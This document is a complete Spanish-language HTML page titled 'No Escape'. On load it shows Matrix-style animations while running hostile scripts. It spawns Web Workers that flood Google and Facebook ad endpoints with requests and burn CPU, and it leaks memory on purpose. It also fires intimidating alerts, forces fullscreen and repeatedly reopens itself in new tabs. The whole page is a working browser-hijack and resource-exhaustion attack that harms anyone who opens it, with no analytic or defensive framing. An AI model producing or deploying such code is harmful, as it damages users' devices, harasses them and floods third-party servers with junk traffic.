<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>No Escape</title>
<style>
body{
  margin:0;
  background:black;
  color:#ff0000;
  font-family:monospace;
  overflow:hidden;
  text-align:center;
}
h1{
  margin-top:80px;
  font-size:5.5rem;
  animation: blink 0.2s infinite;
  text-shadow: 0 0 50px red;
}
#contador{
  font-size:3rem;
  margin:40px;
  text-shadow: 0 0 25px red;
}
@keyframes blink{ 50%{ opacity:0.05; } }
</style>
</head>
<body>
<h1>☢ NO ESCAPE ☢</h1>
<div id="contador">CPU/RAM siendo violada: 0%</div>

<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.28;"></canvas>
<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.22;"></canvas>

<script>
let total = 0;
let running = true;

// Matrix Rain
function createMatrix(id, speed) {
  const canvas = document.getElementById(id);
  const ctx = canvas.getContext("2d");
  
  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener("resize", resize);

  const chars = "0123456789ABCDEFアイウエオ$@#&%";
  const fontSize = 14;
  let columns = canvas.width / fontSize;
  let drops = Array(Math.floor(columns)).fill(1);

  function draw() {
    ctx.fillStyle = "rgba(0,0,0,0.085)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";

    for(let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      
      if(drops[i] * fontSize > canvas.height && Math.random() > 0.97) 
        drops[i] = 0;
      drops[i]++;
    }
  }
  setInterval(draw, speed);
}

createMatrix("c1", 20);
createMatrix("c2", 14);

// Web Workers
function createWorker() {
  const code = `
    self.onmessage = () => {
      setInterval(() => {
        for(let i = 0; i < 10; i++) {
          fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(),
          {mode:"no-cors", cache:"no-store"}).catch(()=>{});
        }
        let x = 0;
        for(let j = 0; j < 90000; j++) x += Math.random() * Math.sin(j);
      }, 3);
    };
  `;
  const blob = new Blob([code], {type: "application/javascript"});
  try {
    const worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage("");
  } catch(e){}
}

// Spam principal
function spamPrincipal() {
  if (!running) return;

  const urls = [
    "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
    "https://connect.facebook.net/en_US/fbevents.js",
    "https://googleads.g.doubleclick.net/pagead/ads"
  ];

  urls.forEach(url => {
    for(let i = 0; i < 6; i++) {
      const cb = "?t=" + Date.now() + Math.random();
      fetch(url + cb, {mode: "no-cors", cache: "no-store"}).catch(() => {});
      new Image().src = url + cb;
    }
  });

  // Memory leak
  window.leakArray = (window.leakArray || []).concat(new Array(12000).fill({data: Math.random()}));

  total++;
  const porcentaje = Math.min(100, Math.floor(total / 4));
  document.getElementById("contador").innerText = `CPU/RAM siendo violada: ${porcentaje}%`;

  setTimeout(spamPrincipal, 6);
}

// Intentos de anti-escape
function antiEscape() {
  // Alert cada pocos segundos
  setInterval(() => {
    if (running) {
      alert("NO ESCAPE\n\nCerrando esta pestaña solo empeorará las cosas...");
    }
  }, 4500);

  // Intento de fullscreen
  document.documentElement.requestFullscreen().catch(() => {});
}

// INICIO AUTOMÁTICO
window.onload = function() {
  // Crear workers
  for(let i = 0; i < 10; i++) {
    createWorker();
  }

  // Ráfaga inicial fuerte
  for(let i = 0; i < 120; i++) {
    setTimeout(spamPrincipal, i * 8);
  }

  spamPrincipal();
  antiEscape();

  // Intento de abrir más pestañas
  setInterval(() => {
    try { window.open(window.location.href, "_blank"); } catch(e){}
  }, 6000);
};
</script>
</body>
</html>
